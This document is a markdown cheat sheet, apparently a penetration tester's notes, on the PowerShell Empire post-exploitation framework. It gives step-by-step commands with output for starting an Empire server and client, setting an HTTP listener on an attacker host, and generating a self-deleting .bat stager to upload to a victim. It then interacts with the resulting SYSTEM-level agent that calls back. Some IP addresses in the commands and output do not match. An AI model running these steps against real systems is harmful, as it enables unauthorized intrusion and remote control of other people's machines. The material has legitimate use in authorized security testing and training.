# PowerShell Empire

A post-exploitation framework which is useful once foothold is obtained.

### Stating up PSempire

* Setup a server

`sudo powershell-empire server`

Server manages all requests and can be understood as a multi-player game server

Server address once started can be like `[*] Starting Empire RESTful API on 0.0.0.0:1337`

* Setup a client

Via client attacker uses server to attack victims. Connect to server address show like one above:

```bash

sudo powershell-empire client

#in the psempire shell connect to local host or other ip

(Empire) > connect -c localhost

[*] Connected to localhost

```

### Connecting to Victim

* To connect to victim it is necessary to setup a `listener` and a `stager`
* listener is going to wait on you attacker host for the stager, which is on victim host, to connect

#### Setup a Listener

```bash
#lsit listeners
(Empire) > listeners

#none right now
┌Listeners List──────┬───────────────────┬────────────┬─────────┐
│ ID │ Name │ Module │ Listener Category │ Created At │ Enabled │
└────┴──────┴────────┴───────────────────┴────────────┴─────────┘

#available listeners
(Empire: listeners) > uselistener

#press TAB after uselistener and get a list of possible listeners
(Empire: listeners) > uselistener
                                   dbx             
                                   http            
                                   http_com        
                                   http_foreign    
                                   http_hop        
                                   http_malleable  
                                   onedrive        
                                   redirector      

#http listener is always a good choice since not blocked mostly by FWs

(Empire: listeners) > uselistener http

 Author       @harmj0y                                                              
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST                                                  
```

Now like with Metasploit set the attacker listener IP and port

```bash

(Empire: uselistener/http) > set Host 192.168.115.111
[*] Set Host to 192.168.119.158
(Empire: uselistener/http) > set Port 443
[*] Set Port to 443

#execute and enjoy

(Empire: uselistener/http) > execute
[+] Listener http successfully started

```

#### Setup a stager

Now somehow we need to connect to a victim. There are two ways of doing it:

1. bind: we connect to a victim
2. reverse: victim connects to us

Both of those ways need a stager that must be transferred to victim and activated preferrably with root or SYSTEM privileges.

```bash
#generate windows stager

(Empire: listeners) > usestager windows/launcher_bat

 Author       @harmj0y                                                            
 Description  Generates a self-deleting .bat launcher for Empire. Only works with 
              the HTTP and HTTP COM listeners.                                    
 Name         windows/launcher_bat  

#assign listener to stager

(Empire: usestager/windows/launcher_bat) > set Listener http
[*] Set Listener to http

# generate stager file 

(Empire: usestager/windows/launcher_bat) > execute
[+] stage1.bat written to /var/lib/powershell-empire/empire/client/generated-stagers/stage1.bat

#upload this stage file to victim host and launch it
#on success you see

[*] Sending agent (stage 2) to TV6GENUD at 192.168.158.10

# check if its really there 

(Empire: usestager/windows/launcher_bat) > agents

┌Agents──────────┬────────────┬───────────────┬─────────────┬
│ 1  │ TV6GENUD* │ powershell │ 172.16.158.10 │ corp\SYSTEM │ powershell │ 3708 │ 5/0.0 │ 2023-03-06 20:40:24 CET │ http     │

# looks good
# start using the connected agent

(Empire: agents) > interact TV6GENUD
(Empire: TV6GENUD) >


```